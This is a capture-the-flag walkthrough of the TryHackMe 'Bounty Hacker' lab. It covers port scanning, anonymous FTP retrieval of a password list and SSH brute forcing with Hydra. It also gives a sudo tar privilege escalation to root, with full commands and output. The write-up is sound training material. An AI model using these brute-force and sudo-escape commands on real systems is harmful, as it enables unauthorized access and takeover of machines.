URL https://tryhackme.com/room/cowboyhacker

Level: Easy

Date: 2 July 2023

Total play time: 20 minutes

- [enumeration](#nmap)
- [attacking services](#anonymous-ftp)
- [bruteforce ssh](#brute-force-ssh)
- [user flag](#user-flag)
- [privilege escalation](#privesc)
- [root flag](#root-flag)

## nmap

```
# Nmap 7.93 scan initiated Sun Jul  2 18:42:53 2023 as: nmap -T4 -p- -n -oA bountyhacker 10.10.0.87
Nmap scan report for 10.10.0.87
Host is up (0.063s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Jul  2 18:45:40 2023 -- 1 IP address (1 host up) scanned in 167.61 seconds
```

## anonymous ftp

```
joshua@kaligra:~/Documents/thm/bountyhacker$ ftp 10.10.0.87
Connected to 10.10.0.87.
220 (vsFTPd 3.0.3)
Name (10.10.0.87:joshua): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||33640|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> pass
Passive mode: off; fallback to active mode: off.
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> prompt
Interactive mode off.
ftp> mget *.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*************************************************************************************************************************************************|   418        6.69 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.54 KiB/s)
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*************************************************************************************************************************************************|    68        0.81 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.48 KiB/s)
ftp>
```

## task file

```
joshua@kaligra:~/Documents/thm/bountyhacker$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

## locks file

```
joshua@kaligra:~/Documents/thm/bountyhacker$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

## web page

![](Pasted%20image%2020230702185429.png)

## users list

Let's populate an usernames list (even from web page):

```bash
joshua@kaligra:~/Documents/thm/bountyhacker$ cat > users
lin
spike
ed
vicious
```


## brute force ssh

```bash
joshua@kaligra:~/Documents/thm/bountyhacker$ hydra -L users -P locks.txt ssh://10.10.0.87
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-02 18:56:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 104 login tries (l:4/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.0.87:22/
[22][ssh] host: 10.10.0.87   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-02 18:56:53
```

## ssh access as lin user

```bash
joshua@kaligra:~/Documents/thm/bountyhacker$ ssh lin@10.10.0.87
The authenticity of host '10.10.0.87 (10.10.0.87)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.87' (ED25519) to the list of known hosts.
lin@10.10.0.87's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker
```

## user flag

```bash
lin@bountyhacker:~/Desktop$ cat user.txt
THM{Cxxxxxxxxx}
```

## privesc

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Let's use this technique:

https://gtfobins.github.io/gtfobins/tar/#sudo

```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```

## root flag

```bash
# cat /root/root.txt
THM{XXXXXXX}
```

